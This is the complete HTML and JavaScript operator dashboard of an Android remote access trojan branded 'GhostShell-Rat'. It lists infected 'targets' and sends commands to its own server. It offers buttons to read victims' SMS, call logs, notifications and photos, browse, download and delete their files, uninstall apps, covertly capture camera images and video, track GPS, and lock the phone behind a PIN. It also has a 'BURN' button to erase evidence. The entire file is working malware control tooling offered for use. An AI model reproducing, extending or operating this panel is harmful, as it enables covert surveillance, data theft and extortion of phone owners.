<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostShell v3.7.1</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', system-ui; }
        :root { --bg:#0b0f0e; --surface:#141a1a; --primary:#00ffc3; --secondary:#ff3b9e; --text:#dbdbdb; --dim:#8fadad; }
        body { background:var(--bg); color:var(--text); padding:10px; overflow-x:hidden; }
        .app-container { max-width:1200px; margin:0 auto; display:grid; grid-template-columns:260px 1fr; gap:15px; }
        .panel { background:var(--surface); border:1px solid var(--primary); border-radius:20px; padding:15px; box-shadow:0 0 15px rgba(0,255,195,0.1); }
        .header { grid-column:1/-1; display:flex; justify-content:space-between; align-items:center; }
        .device-item { background:#1b2626; padding:12px; border-radius:12px; margin-bottom:8px; cursor:pointer; border:1px solid transparent; transition:0.3s; }
        .device-item.active { border-color:var(--secondary); box-shadow:0 0 10px var(--secondary); }
        .status-bar { display:flex; justify-content:space-between; background:#0f1818; padding:10px 15px; border-radius:30px; margin-bottom:15px; border:1px solid #222; font-size:0.9rem; }
        .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(110px, 1fr)); gap:10px; }
        .btn { background:#1b2828; border:1px solid #2f4040; border-radius:18px; padding:15px 5px; text-align:center; color:var(--primary); cursor:pointer; font-size:0.8rem; }
        .btn i { display:block; font-size:1.8rem; margin-bottom:8px; color:var(--secondary); }
        .btn:hover { border-color:var(--primary); box-shadow:0 0 15px var(--primary); }
        .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.9); z-index:100; align-items:center; justify-content:center; padding:15px; }
        .modal-card { background:var(--surface); width:100%; max-width:800px; max-height:85vh; border-radius:25px; border:1px solid var(--primary); display:flex; flex-direction:column; overflow:hidden; }
        .modal-body { padding:15px; overflow-y:auto; flex:1; background:#121d1d; font-size:0.9rem; }
        .modal-footer { padding:12px; background:#0c1616; display:flex; gap:8px; flex-wrap:wrap; border-top:1px solid #222; }
        table { width:100%; border-collapse:collapse; }
        th { color:var(--primary); border-bottom:1px solid #333; padding:8px; text-align:left; }
        td { padding:8px; border-bottom:1px solid #1a2525; color:#ccc; }
        input { background:#1e2e2e; border:1px solid #3b5e5e; padding:8px 15px; border-radius:20px; color:#fff; width:100%; }
        button { background:var(--primary); color:#000; font-weight:bold; border:none; padding:8px 15px; border-radius:20px; cursor:pointer; }
        .red-btn { background:var(--secondary); color:#fff; }
        .gal-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(120px, 1fr)); gap:10px; }
        .gal-item img { width:100%; height:100px; object-fit:cover; border-radius:10px; border:1px solid var(--primary); }
        @media (max-width:700px) { .app-container { grid-template-columns:1fr; } }
    </style>
</head>
<body>
    <div class="app-container">
        <header class="panel header">
            <h1 style="font-size:1.5rem; color:var(--primary);"><i class="fas fa-skull"></i> GhostShell-Rat</h1>
            <div style="color:var(--secondary); font-size:1.2rem;"><i class="fas fa-ghost"></i> ONLINE</div>
        </header>

        <div class="panel">
            <h3 style="color:var(--secondary); margin-bottom:10px;"><i class="fas fa-satellite"></i> TARGETS</h3>
            <div id="device-list">Scanning...</div>
        </div>

        <div class="panel">
            <div class="status-bar">
                <span>üéØ Target: <b id="sel-info" style="color:var(--primary)">None</b></span>
                <span>üì∂ Connection: <b id="conn-stat" style="color:red">OFFLINE</b></span>
            </div>
            <div class="grid" id="main-grid"></div>
        </div>
    </div>

    <div id="modal" class="modal">
        <div class="modal-card">
            <div class="modal-header" style="padding:15px; background:#101b1b; display:flex; justify-content:space-between; align-items:center;">
                <h3 id="modal-title" style="color:var(--secondary)">MODAL</h3>
                <span style="cursor:pointer; font-size:1.5rem;" onclick="closeModal()">&times;</span>
            </div>
            <div class="modal-body" id="modal-body"></div>
            <div class="modal-footer" id="modal-footer"></div>
        </div>
    </div>

    <script>
        let state = { devices: [] }, selId = null, curMod = null, cache = {}, hash = "", flash = false;

        async function cmd(c, b={}) {
            if(!selId) return;
            await fetch('/api/command', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cmd:c, client_id:selId, ...b})});
        }

        function openModal(t) {
            curMod = t; hash = "";
            document.getElementById('modal').style.display = 'flex';
            document.getElementById('modal-title').innerText = t.toUpperCase();
            
            const map = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic' };
            if(map[t]) cmd(map[t]);
            render();
        }

        function closeModal() {
            if(curMod === 'gallery') cmd('exit_gallery');
            if(curMod === 'filemanager') cmd('exit_shell');
            document.getElementById('modal').style.display = 'none'; curMod = null;
        }

        function render() {
            if(!curMod || !selId || !cache[selId]) return;
            const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
            const curHash = JSON.stringify(d[curMod] || d.media || d.location || "");
            if(hash === curHash) return; hash = curHash;
            b.innerHTML = ""; f.innerHTML = "";

            if(curMod === 'sms') {
                b.innerHTML = `<table><tr><th>Sender</th><th>Text</th></tr>${d.sms.map(l=>`<tr><td>${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
            } else if(curMod === 'calls') {
                b.innerHTML = `<table><tr><th>Number</th><th>Dur</th></tr>${d.calls.map(l=>`<tr><td>${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table>`;
            } else if(curMod === 'apps') {
                b.innerHTML = `<table><tr><th>App</th><th>PKG</th></tr>${d.apps.map(a=>`<tr><td>${a.appName}</td><td><button onclick="cmd('run ${a.packageName}')">Run</button> <button class="red-btn" onclick="cmd('uninstall ${a.packageName}')">X</button></td></tr>`).join('')}</table>`;
            } else if(curMod === 'filemanager') {
                const fm = d.fm;
                b.innerHTML = `<div style="display:flex; gap:10px; margin-bottom:10px;"><input id="fmin" placeholder="cd Downloads / storage/emulated/0"><button onclick="cmd(document.getElementById('fmin').value); document.getElementById('fmin').value=''">EXE</button></div><p style="color:var(--primary); font-size:0.7rem; margin-bottom:10px;">Path: ${fm.path}</p><table>${fm.files.map(x=>`<tr><td onclick="cmd('${x.isDirectory?'cd':'get'} ${x.name}')" style="cursor:pointer">${x.isDirectory?'üìÅ':'üìÑ'} ${x.name}</td><td style="text-align:right"><button onclick="cmd('del ${x.name}')">DEL</button></td></tr>`).join('')}</table>`;
                f.innerHTML = `<button onclick="cmd('cd /storage/emulated/0')">SDCARD</button><button onclick="cmd('cd /')">ROOT</button><button onclick="cmd('ls')">REFRESH</button>`;
            } else if(curMod === 'gallery') {
                const g = d.gallery;
                b.innerHTML = `<div class="gal-grid">${g.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.5rem">${x.name}</p></div>`).join('')}</div>`;
                f.innerHTML = `<button onclick="cmd('gallery back')">PREV</button><span>PAGE ${g.page}</span><button onclick="cmd('gallery next')">NEXT</button>`;
            } else if(curMod === 'takebackpic' || curMod === 'takefrontpic' || curMod === 'record_back' || curMod === 'record_front') {
                const m = d.media;
                if(m.last_img || m.last_vid) {
                    const src = m.last_vid && curMod.includes('record') ? m.last_vid : m.last_img;
                    b.innerHTML = `<div style="text-align:center;">${src.endsWith('.mp4') ? `<video src="/captured_images/${src}" controls style="width:100%"></video>` : `<img src="/captured_images/${src}" style="width:100%; border-radius:15px">`}<br><button class="red-btn" style="margin-top:10px;" onclick="delFile('${src}')">BURN (DELETE)</button></div>`;
                } else b.innerHTML = `<p style="text-align:center">${m.status || 'Wait, capturing...'}</p>`;
            } else if(curMod === 'get_location') {
                const loc = d.location;
                if(loc.url) {
                    b.innerHTML = `<div style="text-align:center;">${loc.img?`<img src="${loc.img}" style="width:100%; border-radius:15px; margin-bottom:10px;">`:''}<p style="font-size:0.8rem">${loc.url}</p><br><a href="${loc.url}" target="_blank"><button>Google Maps</button></a></div>`;
                } else b.innerHTML = `<p style="text-align:center">Waiting GPS Koordinat...</p>`;
                f.innerHTML = `<button onclick="cmd('get_location')">REFRESH</button><button class="red-btn" onclick="cmd('stop_location')">STOP</button>`;
            } else if(curMod === 'toast') {
                b.innerHTML = `<p>Message:</p><input id="lmsg" value="SYSTEM LOCKED"><p style="margin-top:10px;">PIN:</p><input id="lpin" value="1234">`;
                f.innerHTML = `<button class="red-btn" onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><button onclick="cmd('toast off')">UNLOCK</button>`;
            } else if(curMod === 'setwallpaper') {
                b.innerHTML = `<p>Direct Image URL:</p><input id="wurl" placeholder="https://domain.com/hack.jpg">`;
                f.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY</button>`;
            } else if(curMod === 'open_url') {
                b.innerHTML = `<p>URL to open:</p><input id="ourl" placeholder="https://google.com">`;
                f.innerHTML = `<button onclick="cmd('open_url '+document.getElementById('ourl').value)">OPEN</button>`;
            } else if(curMod === 'notifications') {
                b.innerHTML = `<table><tr><th>App</th><th>Message</th></tr>${d.notifications.map(n=>`<tr><td>${n.packageName}</td><td>${n.title}: ${n.text}</td></tr>`).join('')}</table>`;
            }
        }

        async function delFile(f) { if(!confirm('Erase evidence?')) return; await fetch('/api/delete', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({filename:f})}); hash=""; render(); }

        async function poll() {
            try {
                const res = await fetch('/api/status');
                state = await res.json();
                document.getElementById('device-list').innerHTML = state.devices.map(d=>`<div class="device-item ${selId===d.id?'active':''}" onclick="selId='${d.id}'; updateMain();">${d.model}<br><small>${d.id} ¬∑ ${d.bat}</small></div>`).join('') || "No target online.";
                if(selId) {
                    const dres = await fetch(`/api/data/${selId}`);
                    cache[selId] = await dres.json();
                    if(curMod) render();
                }
            } catch(e){}
            setTimeout(poll, 3000);
        }

        function updateMain() {
            const e = !!selId;
            document.getElementById('sel-info').innerText = selId || "None";
            document.getElementById('conn-stat').innerText = e ? "ONLINE":"OFFLINE";
            document.getElementById('conn-stat').style.color = e ? "#00ffc3":"#ff3b9e";
            
            const btns = [
                {id:'sms', i:'fa-sms', l:'SMS'}, {id:'calls', i:'fa-phone', l:'CALLS'}, {id:'filemanager', i:'fa-folder', l:'FILES'},
                {id:'gallery', i:'fa-images', l:'GALLERY'}, {id:'notifications', i:'fa-bell', l:'NOTIFS'}, {id:'apps', i:'fa-th', l:'APPS'},
                {id:'get_location', i:'fa-map-marker-alt', l:'GPS'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
                {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
                {id:'record_back', i:'fa-circle-dot', l:'REC BACK'}, {id:'record_front', i:'fa-record-vinyl', l:'REC FRONT'},
                {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'}, {id:'toast', i:'fa-lock', l:'LOCK/MSG'},
                {id:'open_url', i:'fa-external-link-alt', l:'OPEN URL'}
            ];
            document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn" onclick="${b.id==='flash'?'flash=!flash; cmd(flash?\'flashon\':\'flashoff\')':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
        }
        poll();
    </script>
</body>
</html>
